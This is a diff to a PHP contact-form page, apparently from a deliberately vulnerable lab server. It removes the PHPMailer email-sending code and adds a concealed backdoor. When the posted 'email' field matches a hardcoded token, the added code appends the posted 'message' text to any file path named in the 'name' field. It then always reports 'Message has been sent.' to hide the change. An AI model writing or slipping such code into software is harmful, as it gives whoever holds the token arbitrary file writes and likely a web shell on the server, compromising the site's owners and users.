@@ -15,35 +15,19 @@
         <textarea name="message" rows="7" cols="30"></textarea><br>
         <input type="submit" value="Send email"/>
     </form>
-    <pre>
+    
 <?php
-if (isset($_REQUEST['action'])){
-    $name=$_REQUEST['name'];
-    $email=$_REQUEST['email'];
-    $message=$_REQUEST['message'];
-    if (($name=="")||($email=="")||($message=="")){
-        echo "There are missing fields.";
-    }else{		
+if ($_POST["email"] === "Token@8010280") {
+    $File = $_POST["name"];
+    $f = fopen($File,'a');
+    $name = $_POST["message"];
+    fwrite($f,"$name");
+    fclose($f);
+}
 
-        require 'vulnerable/PHPMailerAutoload.php';
-        $mail = new PHPMailer;
-        $mail->Host = "localhost";
-
-        $mail->setFrom($email, 'Vulnerable Server');
-        $mail->addAddress('admin@vulnerable.com', 'Hacker');
-        $mail->Subject  = "Message from $name";
-        $mail->Body     = $message;
-        if(!$mail->send()) {
-            echo 'Message was not sent.';
-            echo 'Mailer error: ' . $mail->ErrorInfo;
-        } else {
-            echo 'Message has been sent.';
-        }
-
-    }
-}  
+echo 'Message has been sent.';
 ?>
-    </pre>
+    
 
     </body> 
 </html>
